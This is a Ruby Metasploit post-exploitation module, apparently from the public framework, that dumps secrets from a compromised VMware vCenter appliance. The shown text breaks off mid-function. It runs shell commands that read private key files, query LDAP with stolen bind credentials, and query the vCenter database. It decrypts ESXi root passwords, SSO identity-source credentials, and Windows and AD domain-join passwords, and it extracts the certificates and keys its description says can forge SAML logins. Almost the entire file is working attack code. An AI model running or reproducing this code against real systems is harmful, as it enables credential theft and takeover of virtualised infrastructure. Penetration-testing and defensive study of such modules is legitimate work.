##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Auxiliary::Report

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Secrets Dump',
        'Description' => %q{
          Grab secrets and keys from the vCenter server and add them to
          loot. This module is tested against the vCenter appliance only;
          it will not work on Windows vCenter instances. It is intended to
          be run after successfully acquiring root access on a vCenter
          appliance and is useful for penetrating further into the
          environment following a vCenter exploit that results in a root
          shell.

          Secrets include the dcAccountDN and dcAccountPassword for
          the vCenter machine which can be used for maniuplating the SSO
          domain via standard LDAP interface; good for plugging into the
          vmware_vcenter_vmdir_ldap module or for adding new SSO admin
          users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with
          associated private keys are also plundered and can be used to
          sign forged SAML assertions for the /ui admin interface.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-04-15',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Dump vCenter Secrets'
            }
          ]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        },
        'Privileged' => true
      )
    )
    register_advanced_options([
      OptBool.new('DUMP_VMDIR', [ true, 'Extract SSO domain information', true ]),
      OptBool.new('DUMP_VMAFD', [ true, 'Extract vSphere certificates, private keys, and secrets', true ]),
      OptBool.new('DUMP_SPEC', [ true, 'If DUMP_VMAFD is enabled, attempt to extract VM Guest Customization secrets from PSQL', true ])
    ])
  end

  def run
    validate_target

    print_status('Gathering vSphere SSO domain information ...')
    vmdir_init

    print_status('Extracting PostgreSQL database credentials ...')
    get_db_creds

    print_status('Extract ESXi host vpxuser credentials ...')
    enum_vpxuser_creds

    if datastore['DUMP_VMDIR']
      print_status('Extracting vSphere SSO domain secrets ...')
      vmdir_dump
    end

    if datastore['DUMP_VMAFD']
      print_status('Extracting certificates from vSphere platform ...')
      vmafd_dump
      if datastore['DUMP_SPEC']
        print_status('Searching for secrets in VM Guest Customization Specification XML ...')
        enum_vm_cust_spec
      end
    end
  end

  def vmdir_init
    @keystore = {}

    vsphere_machine_id = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-machine-id --server-name localhost')
    unless validate_uuid(vsphere_machine_id)
      fail_with(Msf::Exploit::Failure::Unknown, 'Invalid vSphere PSC Machine UUID returned from vmafd-cli')
    end
    vprint_status("vSphere Machine ID: #{vsphere_machine_id}")

    vsphere_machine_hostname = cmd_exec('hostname')
    @vcenter_fqdn = vsphere_machine_hostname

    vsphere_machine_ipv4 = cmd_exec('ifconfig | grep eth0 -A1 | grep "inet addr" | awk -F \':\' \'{print $2}\' | awk -F \' \' \'{print $1}\'')
    unless validate_ipv4(vsphere_machine_ipv4)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter eth0 IPv4')
    end
    print_status("vSphere Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")

    vsphere_domain_name = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmafd\Parameters]\'|grep DomainName|awk \'{print $4}\'|tr -d \'"\'')
    unless validate_fqdn(vsphere_domain_name)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vSphere SSO domain name via lwregshell')
    end

    @base_fqdn = vsphere_domain_name.to_s.downcase
    vprint_status("vSphere SSO Domain FQDN: #{@base_fqdn}")

    vsphere_domain_dn = 'dc=' + @base_fqdn.split('.').join(',dc=')
    @base_dn = vsphere_domain_dn
    vprint_status("vSphere SSO Domain DN: #{@base_dn}")

    vprint_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...')

    vsphere_domain_dc_dn = cmd_exec('/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountDN|awk \'{$1=$2=$3="";print $0}\'|tr -d \'"\'|sed -e \'s/^[ \t]*//\'')
    unless validate_dn(vsphere_domain_dc_dn)
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountDN from lwregshell')
    end

    @bind_dn = vsphere_domain_dc_dn
    print_good("vSphere SSO DC DN: #{@bind_dn}")

    @bind_pw = cmd_exec('echo $(/opt/likewise/bin/lwregshell list_values \'[HKEY_THIS_MACHINE\Services\vmdir]\'|grep dcAccountPassword |awk -F \'REG_SZ\' \'{print $2}\')')
    unless @bind_pw
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountPassword from lwregshell')
    end

    @bind_pw = @bind_pw[1..@bind_pw.length - 2]
    print_good("vSphere SSO DC PW: #{@bind_pw}")
    @shell_bind_pw = "'#{@bind_pw.gsub('\"', '"').gsub("'") { "\\'" }}'"

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 389,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @base_fqdn
    }

    store_valid_credential(user: @bind_dn, private: @bind_pw, service_data: extra_service_data)

    get_aes_keys
  end

  def vmdir_dump
    temp_ldif_ts = Time.now.strftime('%Y%m%d%H%M%S')
    temp_ldif_file = "/tmp/#{@base_fqdn}_#{temp_ldif_ts}.TMP"

    # TODO: Make this less jank. LDIF data is too big to put in a string, the
    #       only way to get a complete copy is to write it to the filesystem
    #       on the appliance first and copy it to our local machine for
    #       processing. This is slow and inefficient and there is probably a
    #       much better way. I would also love to lose the ARTIFACTS_ON_DISK
    #       side effect.
    print_status('Dumping vmdir schema to LDIF ...')
    shell_cmd = "/opt/likewise/bin/ldapsearch -b '#{@base_dn}' -s sub -D '#{@bind_dn}' -w #{@shell_bind_pw} \\* \\+ \\- \> #{temp_ldif_file}"
    cmd_exec(shell_cmd)

    vprint_status("Copying LDF from remote folder #{temp_ldif_file} to loot ...")
    vmdir_ldif = read_file(temp_ldif_file).gsub(/^$\n/, '')
    p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
    print_good("LDIF Dump: #{p}")

    if (rm_f temp_ldif_file)
      vprint_good("Removed temporary file from vCenter appliance: #{temp_ldif_file}")
    else
      print_warning("Unable to remove temporary file from vCenter appliance: #{temp_ldif_file}")
    end

    print_status('Processing vmdir LDIF (this may take several minutes) ...')
    ldif_file = ::File.open(p, 'rb')
    ldif_data = Net::LDAP::Dataset.read_ldif(ldif_file)

    print_status('Processing LDIF entries ...')
    entries = ldif_data.to_entries

    print_status('Processing SSO account hashes ...')
    vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? }
    process_hashes(vmware_sso_hash_entries)

    print_status('Processing SSO identity sources ...')
    vmware_sso_id_entries = entries.select { |entry| entry[:vmwSTSConnectionStrings].any? }
    process_sso_providers(vmware_sso_id_entries)
  end

  def vmafd_dump
    get_vmca_cert
    get_idp_cert
    shell_cmd = '/usr/lib/vmware-vmafd/bin/vecs-cli store list'
    vecs_stores = cmd_exec(shell_cmd).split("\n")
    unless vecs_stores.first
      fail_with(Msf::Exploit::Failure::Unknown, 'Empty vecs-cli store list returned from vCenter')
    end

    vecs_stores.each do |vecs_store|
      shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Entry type :' | awk -F ':' '{print $2}' | tr -d \"\t\""
      vecs_entry_type = cmd_exec(shell_cmd).to_s.downcase
      next unless vecs_entry_type == 'private key'

      shell_cmd = "/usr/lib/vmware-vmafd/bin/vecs-cli entry list --store #{vecs_store} | grep 'Alias :' | awk -F ':' '{print $2}' | tr -d \"\t\""
      get_vecs_entry(vecs_store, cmd_exec(shell_cmd))
    end
  end

  def get_vecs_entry(store_name, entry_alias)
    store_label = store_name.upcase

    vprint_status("Extract #{store_label} key ...")
    key_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getkey --store #{store_name} --alias #{entry_alias}")
    unless (key = OpenSSL::PKey::RSA.new(key_b64))
      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} private key")
    end
    p = store_loot(entry_alias, 'PEM', rhost, key.to_pem.to_s, "#{store_label}.key", "vCenter #{store_label} Private Key")
    print_good("#{store_label} key: #{p}")

    vprint_status("Extract #{store_label} cert ...")
    cert_b64 = cmd_exec("/usr/lib/vmware-vmafd/bin/vecs-cli entry getcert --store #{store_name} --alias #{entry_alias}")
    unless (cert = OpenSSL::X509::Certificate.new(cert_b64))
      fail_with(Msf::Exploit::Failure::Unknown, "Could not extract #{store_label} certificate")
    end
    p = store_loot(entry_alias, 'PEM', rhost, cert.to_pem.to_s, "#{store_label}.pem", "vCenter #{store_label} Certificate")
    print_good("#{store_label} cert: #{p}")

    update_keystore(cert, key)
  end

  def get_vmca_cert
    vprint_status('Extract VMCA_ROOT key ...')

    unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate VMCA_ROOT keypair')
    end

    vmca_key_b64 = cmd_exec('cat /var/lib/vmware/vmca/privatekey.pem')

    unless (vmca_key = OpenSSL::PKey::RSA.new(vmca_key_b64))
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT private key')
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_key, 'VMCA_ROOT.key', 'vCenter VMCA root CA private key')
    print_good("VMCA_ROOT key: #{p}")

    vprint_status('Extract VMCA_ROOT cert ...')
    vmca_cert_b64 = cmd_exec('cat /var/lib/vmware/vmca/root.cer')

    unless (vmca_cert = OpenSSL::X509::Certificate.new(vmca_cert_b64))
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not extract VMCA_ROOT certificate')
    end

    unless vmca_cert.check_private_key(vmca_key)
      fail_with(Msf::Exploit::Failure::Unknown, 'VMCA_ROOT certificate and private key mismatch')
    end

    p = store_loot('vmca', 'PEM', rhost, vmca_cert, 'VMCA_ROOT.pem', 'vCenter VMCA root CA certificate')
    print_good("VMCA_ROOT cert: #{p}")

    update_keystore(vmca_cert, vmca_key)
  end

  # Shamelessly borrowed from vmware_vcenter_vmdir_ldap.rb
  def process_hashes(entries)
    if entries.empty?
      print_warning('No password hashes found')
      return
    end

    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: rhost,
      port: '389',
      protocol: 'tcp',
      service_name: 'vmdir/ldap'
    }

    entries.each do |entry|
      # This is the "username"
      dn = entry.dn

      # https://github.com/vmware/lightwave/blob/3bc154f823928fa0cf3605cc04d95a859a15c2a2/vmdir/server/middle-layer/password.c#L32-L76
      type, hash, salt = entry[:userpassword].first.unpack('CH128H32')

      case type
      when 1
        unless hash.length == 128
          vprint_error("Type #{type} hash length is not 128 digits (#{dn})")
          next
        end

        unless salt.length == 32
          vprint_error("Type #{type} salt length is not 32 digits (#{dn})")
          next
        end

        # https://github.com/magnumripper/JohnTheRipper/blob/2778d2e9df4aa852d0bc4bfbb7b7f3dde2935b0c/doc/DYNAMIC#L197
        john_hash = "$dynamic_82$#{hash}$HEX$#{salt}"
      else
        vprint_error("Hash type #{type.inspect} is not supported yet (#{dn})")
        next
      end

      print_good("vSphere SSO User Credential: #{dn}:#{john_hash}")

      create_credential(service_details.merge(
        username: dn,
        private_data: john_hash,
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(john_hash)
      ))
    end
  end

  def process_sso_providers(entries)
    if entries.empty?
      print_warning('No SSO ID provider information found')
      return
    end

    if entries.is_a?(String)
      entries = entries.split("\n")
    end

    entries.each do |entry|
      sso_prov_type = entry[:vmwSTSProviderType].first
      sso_conn_str = entry[:vmwSTSConnectionStrings].first
      sso_user = entry[:vmwSTSUserName].first

      # On vCenter 7.x instances the tenant AES key was always Base64 encoded vs. plaintext, and vmwSTSPassword was missing from the LDIF dump.
      # It appears that vCenter 7.x does not return vmwSTSPassword even with appropriate LDAP flags - this is not like prior versions.
      # The data can still be extracted directly with ldapsearch syntax below which works in all versions, but is a PITA.
      shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"

      vmdir_user_sso_pass = cmd_exec(shell_cmd).split("\n").last
      sso_pass = tenant_aes_decrypt(vmdir_user_sso_pass)

      sso_domain = entry[:vmwSTSDomainName].first

      sso_conn_uri = URI.parse(sso_conn_str)

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: sso_conn_uri.port,
        service_name: sso_conn_uri.scheme,
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: sso_domain
      }

      store_valid_credential(user: sso_user, private: sso_pass, service_data: extra_service_data)
      print_status('Found SSO Identity Source Credential:')
      print_good("#{sso_prov_type} @ #{sso_conn_str}:")
      print_good("\t  SSOUSER: #{sso_user}")
      print_good("\t  SSOPASS: #{sso_pass}")
      print_good("\tSSODOMAIN: #{sso_domain}")
    end
  end

  def get_aes_keys
    # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
    print_status('Extract vmdird tenant AES encryption key ...')
    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
    tenant_key = cmd_exec(shell_cmd).split("\n").last

    unless tenant_key.include? 'vmwSTSTenantKey'
      fail_with(Msf::Exploit::Failure::Unknown, 'Error extracting tenant AES encryption key')
    end

    if tenant_key.include? 'vmwSTSTenantKey:: '
      tenant_aes_key = tenant_key.split('vmwSTSTenantKey:: ').last.encode('iso-8859-1')
    else
      tenant_aes_key = tenant_key.split('vmwSTSTenantKey: ').last.encode('iso-8859-1')
    end

    case tenant_aes_key.length
    when 16
      @vc_tenant_aes_key = tenant_aes_key
      @vc_tenant_aes_key_hex = @vc_tenant_aes_key.unpack('H*').first
      vprint_status("vCenter returned a plaintext AES key: #{tenant_aes_key}")
    when 24
      @vc_tenant_aes_key = Base64.strict_decode64(tenant_aes_key)
      @vc_tenant_aes_key_hex = Base64.strict_decode64(tenant_aes_key).unpack('H*').first
      vprint_status("vCenter returned a Base64 AES key: #{tenant_aes_key}")
    else
      fail_with(Msf::Exploit::Failure::Unknown, "Invalid tenant AES encryption key size - expecting 16 raw bytes or 24 Base64 bytes, got #{tenant_aes_key.length}")
    end

    print_good("vSphere Tenant AES encryption\n\tKEY: #{tenant_aes_key}\n\tHEX: #{@vc_tenant_aes_key_hex}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 389,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @base_fqdn
    }

    store_valid_credential(user: 'STS AES key', private: tenant_aes_key, service_data: extra_service_data)

    print_status('Extract vmware-vpx AES key ...')
    unless file_exist?('/etc/vmware-vpx/ssl/symkey.dat')
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate /etc/vmware-vpx/ssl/symkey.dat')
    end

    sym_key = cmd_exec('cat /etc/vmware-vpx/ssl/symkey.dat')
    @vc_sym_key = sym_key.scan(/../).map(&:hex).pack('C*')
    print_good("vSphere vmware-vpx AES encryption\n\tHEX: #{sym_key}")

    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 5432,
      service_name: 'psql',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @base_fqdn
    }

    store_valid_credential(user: 'VPX AES key', private: sym_key, service_data: extra_service_data)
  end

  def tenant_aes_decrypt(b64)
    # https://github.com/vmware/lightwave/blob/master/vmidentity/idm/server/src/main/java/com/vmware/identity/idm/server/CryptoAESE.java#L44-L45
    ciphertext = Base64.strict_decode64(b64)
    decipher = OpenSSL::Cipher.new('aes-128-ecb')
    decipher.decrypt
    decipher.padding = 0
    decipher.key = @vc_tenant_aes_key
    (decipher.update(ciphertext) + decipher.final).delete("\000")
  end

  def vpx_aes_decrypt(b64)
    # https://www.pentera.io/wp-content/uploads/2022/03/Sensitive-Information-Disclosure_VMware-vCenter_f.pdf
    secret_bytes = Base64.strict_decode64(b64)
    iv = secret_bytes[0, 16]
    ciphertext = secret_bytes[16, 64]
    decipher = OpenSSL::Cipher.new('aes-256-cbc')
    decipher.decrypt
    decipher.iv = iv
    decipher.padding = 1
    decipher.key = @vc_sym_key
    (decipher.update(ciphertext) + decipher.final).delete("\000")
  end

  def update_keystore(public, private)
    cert = OpenSSL::X509::Certificate.new(public)
    key = OpenSSL::PKey::RSA.new(private)
    cert_thumbprint = OpenSSL::Digest::SHA1.new(cert.to_der).to_s
    @keystore[cert_thumbprint] = key
  end

  def get_idp_cert
    vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')

    shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"

    idp_keys = []
    idp_certs = []

    idp_key = cmd_exec(shell_cmd).strip!
    if idp_key
      keycol = "#{idp_key}\n"
      keycol.each_line do |keyline|
        b64formatted = keyline.scan(/.{1,64}/).join("\n")
        idp_key_b64 = "-----BEGIN PRIVATE KEY-----\n#{b64formatted}\n-----END PRIVATE KEY-----"
        unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
          fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
        end
        idp_keys << privkey
        shell_cmd = "/opt/likewise/bin/ldapsearch -h localhost -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
        idp_chain = cmd_exec(shell_cmd).strip!
        certcol = "#{idp_chain}\n"
        certcol.each_line do |certline|
          b64formatted = certline.scan(/.{1,64}/).join("\n")
          idp_cert_b64 = "-----BEGIN CERTIFICATE-----\n#{b64formatted}\n-----END CERTIFICATE-----"
          unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
            fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain')
          end
          idp_certs << idp_cert
        end
      end
    else
      print_warning('vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files ...')
      unless file_exist?('/etc/vmware-sso/keys/ssoserverSign.key') && file_exist?('/etc/vmware-sso/keys/ssoserverSign.crt')
        fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate IdP keypair')
      end
      shell_cmd = 'cat /etc/vmware-sso/keys/ssoserverSign.key'
      idp_key_b64 = cmd_exec(shell_cmd)
      unless (privkey = OpenSSL::PKey::RSA.new(idp_key_b64))
        fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
      end
      idp_keys << privkey
      shell_cmd = 'cat /etc/vmware-sso/keys/ssoserverSign.crt'
      idp_cert_b64 = cmd_exec(shell_cmd)
      unless (idp_cert = OpenSSL::X509::Certificate.new(idp_cert_b64))
        fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate chain')
      end
      idp_certs << idp_cert
    end

    vprint_status('Parsing vmwSTSTenantCredential certificates and keys ...')

    # vCenter vmdir stores the STS IdP signing credential under the following DN:
    #    cn=TenantCredential-1,cn=<sso domain>,cn=Tenants,cn=IdentityManager,cn=Services,<root dn>
    #
    # TODO: Right now this returns only the first valid keypair that is found and stops iterating
    #      or dies if no valid keypair is located. This is fine for 99% of cases but complex or
    #      unusual environments may have more than one TenantCredential and currently we stop
    #      extracting keys at the first valid pair.

    sts_cert = nil
    sts_key = nil
    sts_pem = nil

    idp_keys.each do |stskey|
      idp_certs.each do |stscert|
        next unless stscert.check_private_key(stskey)

        sts_cert = stscert.to_pem.to_s
        sts_key = stskey.to_pem.to_s
        if validate_sts_cert(sts_cert)
          vprint_status('Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate')
        else # Query IDM to compare our extracted cert with the IDM advertised cert
          print_warning('Could not reconcile vmdir STS IdP cert chain with cert chain advertised by IDM - this credential may not work')
        end
        sts_pem = "#{sts_key}#{sts_cert}"
      end
    end

    unless sts_pem # We were unable to link a public and private key together
      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to associate IdP certificate and private key')
    end

    p = store_loot('idp', 'PEM', rhost, sts_key, 'SSO_STS_IDP.key', 'vCenter SSO IdP private key')
    print_good("SSO_STS_IDP key: #{p}")

    p = store_loot('idp', 'PEM', rhost, sts_cert, 'SSO_STS_IDP.pem', 'vCenter SSO IdP certificate')
    print_good("SSO_STS_IDP cert: #{p}")

    update_keystore(sts_cert, sts_key)
  end

  def enum_vm_cust_spec
    shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT DISTINCT name FROM vpx_customization_spec;' -P pager -A -t"
    vpx_customization_specs = cmd_exec(shell_cmd).split("\n")

    unless vpx_customization_specs.first
      print_warning('No vpx_customization_spec entries evident')
      return
    end

    vpx_customization_specs.each do |spec|
      print_status("Processing vpx_customization_spec '#{spec}' ...")

      shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c \"SELECT body FROM vpx_customization_spec WHERE name = '#{spec}\';\" -P pager -A -t"
      xml = cmd_exec(shell_cmd).to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')

      xmldoc = Nokogiri::XML(xml) do |config|
        config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
      end

      unless xmldoc
        print_error("Could not parse XML document from PSQL query output for VM Guest Customization Template '#{spec}'")
        next
      end

      unless (enc_cert_len = xmldoc.at_xpath('/ConfigRoot/encryptionKey/_length').text.to_i)
        print_error("Could not determine DER byte length for VM Guest Customization Template '#{spec}'")
        next
      end

      enc_cert_der = []
      der_idx = 0

      print_status('Validating data encipherment key ...')
      while der_idx <= enc_cert_len - 1
        enc_cert_der << xmldoc.at_xpath("/ConfigRoot/encryptionKey/e[@id=#{der_idx}]").text.to_i
        der_idx += 1
      end

      enc_cert = OpenSSL::X509::Certificate.new(enc_cert_der.pack('C*'))
      enc_cert_thumbprint = OpenSSL::Digest::SHA1.new(enc_cert.to_der).to_s
      vprint_status("Secrets for '#{spec}' were encrypted using public certificate with SHA1 digest #{enc_cert_thumbprint}")

      unless (enc_keystore_entry = @keystore[enc_cert_thumbprint])
        print_warning('Could not associate encryption public key with any of the private keys extracted from vCenter, skipping')
        next
      end

      unless (vc_cipher_key = OpenSSL::PKey::RSA.new(enc_keystore_entry))
        print_error("Could not access private key for VM Guest Customization Template '#{spec}', cannot decrypt")
        next
      end

      unless enc_cert.check_private_key(vc_cipher_key)
        print_error("vCenter private key does not associate with public key for VM Guest Customization Template '#{spec}', cannot decrypt")
        next
      end

      key_digest = OpenSSL::Digest::SHA1.new(vc_cipher_key.to_der).to_s
      vprint_status("Decrypt using #{vc_cipher_key.n.num_bits}-bit #{vc_cipher_key.oid} SHA1: #{key_digest}")

      # Check for static local machine password
      if (sysprep_element_unattend = xmldoc.at_xpath('/ConfigRoot/identity/guiUnattended'))
        next unless sysprep_element_unattend.at_xpath('//guiUnattended/password/plainText')

        secret_is_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/plainText').text

        case secret_is_plaintext.downcase
        when 'true'
          secret_plaintext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
        when 'false'
          secret_ciphertext = sysprep_element_unattend.xpath('//guiUnattended/password/value').text
          ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
          secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
        else
          print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
          next
        end
        print_status("Initial administrator account password found for vpx_customization_spec '#{spec}':")
        print_good("\tInitial Admin PW: #{secret_plaintext}")

        extra_service_data = {
          address: Rex::Socket.getaddress(rhost),
          port: 445,
          protocol: 'tcp',
          service_name: 'Windows',
          workspace_id: myworkspace_id,
          module_fullname: fullname,
          origin_type: :service,
          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
          realm_value: '.'
        }

        store_valid_credential(user: '(local built-in administrator)', private: secret_plaintext, service_data: extra_service_data)
      end

      # Check for account used for domain join
      next unless (domain_element_unattend = xmldoc.at_xpath('//identification'))
      next unless domain_element_unattend.at_xpath('//identification/domainAdminPassword/plainText')

      secret_is_plaintext = domain_element_unattend.xpath('//identification/domainAdminPassword/plainText').text
      domain_user = domain_element_unattend.xpath('//identification/domainAdmin').text
      domain_base = domain_element_unattend.xpath('//identification/joinDomain').text

      case secret_is_plaintext.downcase
      when 'true'
        secret_plaintext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
      when 'false'
        secret_ciphertext = sysprep_element_unattend.xpath('//identification/domainAdminPassword/value').text
        ciphertext_bytes = Base64.strict_decode64(secret_ciphertext.to_s).reverse
        secret_plaintext = vc_cipher_key.decrypt(ciphertext_bytes, rsa_padding_mode: 'pkcs1').delete("\000")
      else
        print_error("Malformed XML received from vCenter for VM Guest Customization Template '#{spec}'")
        next
      end

      print_status("AD domain join account found for vpx_customization_spec '#{spec}':")

      case domain_base.include?('.')
      when true
        print_good("\tAD User: #{domain_user}@#{domain_base}")
      when false
        print_good("\tAD User: #{domain_base}\\#{domain_user}")
      end
      print_good("\tAD Pass: #{secret_plaintext}")

      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 445,
        protocol: 'tcp',
        service_name: 'Windows',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: domain_base
      }

      store_valid_credential(user: domain_user, private: secret_plaintext, service_data: extra_service_data)
    end
  end

  def enum_vpxuser_creds
    shell_cmd = "export PGPASSWORD=#{@shell_vcdb_pass}; /opt/vmware/vpostgres/current/bin/psql -h 'localhost' -U '#{@vcdb_user}' -d '#{@vcdb_name}' -c 'SELECT dns_name, ip_address, user_name, password FROM vc.vpx_host;' -P pager -A -t"
    vpxuser_rows = cmd_exec(shell_cmd).split("\n")

    unless vpxuser_rows.first
      print_warning('No ESXi hosts attached to this vCenter system')
      return
    end

    vpxuser_rows.each do |vpxuser_row|
      row_data = vpxuser_row.split('|')
      esxi_fqdn = row_data[0]
      esxi_ipv4 = row_data[1]
      esxi_user = row_data[2]

      vpxuser_secret_b64 = row_data[3].gsub('*', '')
      esxi_pass = vpx_aes_decrypt(vpxuser_secret_b64)

      print_good("ESXi Host #{esxi_fqdn} [#{esxi_ipv4}]\t LOGIN: #{esxi_user} PASS: #{esxi_pass}")

      extra_service_data = {
        address: esxi_ipv4,
        port: 22,
        protocol: 'tcp',
        service_name: 'ssh',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: esxi_fqdn
      }

      store_valid_credential(user: 'root', private: esxi_pass, service_data: extra_service_data)
    end
  end

  def get_db_creds
    unless file_exist?('/etc/vmware-vpx/vcdb.properties')
      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /etc/vmware-vpx/vcdb.properties')
    end

    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep jdbc:postgresql:// | awk -F '/' '{print $4}' | awk -F '?' '{print $1}'"
    @vcdb_name = cmd_exec(shell_cmd)

    shell_cmd = "cat /etc/vmware-vpx/vcdb.properties | grep username | awk -F '=' '{print $2}'| tr -d ' '"
    @vcdb_user = cmd_exec(shell_cmd)

    shell_cmd = 'cat /etc/vmware-vpx/vcdb.properties | grep password | grep -v encrypted | cut -c 12-'
    @vcdb_pass = cmd_exec(shell_cmd)

    @shell_vcdb_pass = "'#{@vcdb_pass.gsub("'") { "\\'" }}'"

    print_good("\tVCDB Name: #{@vcdb_name}")
